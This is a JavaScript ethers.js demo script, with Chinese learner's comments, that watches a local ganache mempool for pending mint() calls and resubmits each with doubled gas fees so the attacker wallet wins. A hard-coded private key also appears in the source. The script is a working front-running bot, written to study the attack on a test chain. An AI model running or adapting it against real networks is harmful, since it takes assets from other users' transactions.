/**
 * 抢跑交易：把别人的交易给抢跑了，让别人交易作废
 * demo演示流程：
 * ①启动ganache，获取链接(http://127.0.0.1:7454 或 ws://127.0.0.1:7454)
 * ②利用Remix部署合约：22_FrontRun.sol，在部署页面的ENVIRONMENT中选择本地ganache
 * ③运行该js程序，监听mint函数
 * ④Remix中调用mint函数，观察js的运行日志，并在remix中查看代币的归属人是否hacker
 * 
 * 问题：
 * 1.抢跑只是插入了一笔交易，并没有插在原交易前面
 * 2.追加gas费，不能有小数点吗
 * 3.研究下交易体信息
 * 
 * 
 * todo syj
 * 1.跑通流程（暂不用细究fundry)
 * 2.把mint函数调整下入参
 */

const {ethers, utils} = require('ethers');
const ignore_keyConfig = require('./keyConfig_info.json');

//1.创建provider
var url = "ws://127.0.0.1:7545";
// const provider = new ethers.providers.WebSocketProvider(url);
const provider = new ethers.WebSocketProvider(url);

// const provider = new ethers.JsonRpcProvider(url);
let network = provider.getNetwork();
network.then(res => console.log(`[${(new Date).toLocaleTimeString()}] 连接到 chain ID ${res.chainId}`));

// 2.创建Interface对象，用于解码交易详情
const iface = new ethers.Interface([
    "function mint() external"
])

console.log("\n3.创建钱包,用于发送抢跑交易");
//0x52eeA5ce0FBc079E1658824884dE405f2Ef34c27
// const privateKey = ignore_keyConfig.syj.privateKey;
const privateKey = "0x5bccb98044ee2ebb48894029cfc46da9da4426f6ccfc0919d6f6832161ebf439";
const wallet = new ethers.Wallet(privateKey, provider);

const main = async() => {
    console.log("\n4.监听pending交易，获取txHash， 并输出交易详情")
    provider.on("pending", async(txHash) => {
        if(txHash) {
            let tx = await provider.getTransaction(txHash);
            if(tx) {
                //getSighash为什么不用selector，不等号也有问题 todo syj
                // if(tx.data.indexOf(iface.getSighash("mint")) !== -1 && tx.from != wallet.address) {
                if(tx.data.indexOf(iface.getFunction("mint").selector) !== -1 && tx.from != wallet.address ) {

                    console.log(`\n[${(new Date).toLocaleTimeString()}] 监听Pending交易: ${txHash} \r`);

                    let parseTx = iface.parseTransaction(tx);
                    console.log(`解析后交易信息为`);
                    console.log(parseTx);
                    console.log(`原始交易信息为`);
                    console.log(tx);

                    console.log("\n5.构建抢跑交易");
                    const txFrontRun = {
                        to: tx.to,
                        value: tx.value,
                        //小费
                        maxPriorityFeePerGas: tx.maxPriorityFeePerGas * 2n,
                        //gas费上限,这个是根据全网gas费动态变化的
                        maxFeePerGas: tx.maxFeePerGas * 2n,
                        //gas数量上限
                        gasLimit: tx.gasLimit * 2n,
                        //这是由上个区块决定的，改变不了
                        // baseFeePerGas:tx.baseFeePerGas,
                        
                        //不是extraData？
                        data: tx.data
                    }
                    console.log("发起抢跑交易");
                    var txResponse = await wallet.sendTransaction(txFrontRun);
                    console.log("正在frontrun交易")
                    console.log(txResponse)
                    await txResponse.wait();
                    console.log("抢跑成功")
                }
            }
        }
    });

    // provider._websocket.on("error", async () => {
    //     console.log(`Unable to connect to ${ep.subdomain} retrying in 3s.....`);
    //     setTimeout(init, 3000);
    // })

    // provider._websocket.on("close", async (code) => {
    //     console.log(`connection lost with code ${code} !Attempting reconnect in 3s....`);
    //     provider._websocket.terminate();
    //     setTimeout(init, 3000);
    // });
}

main()
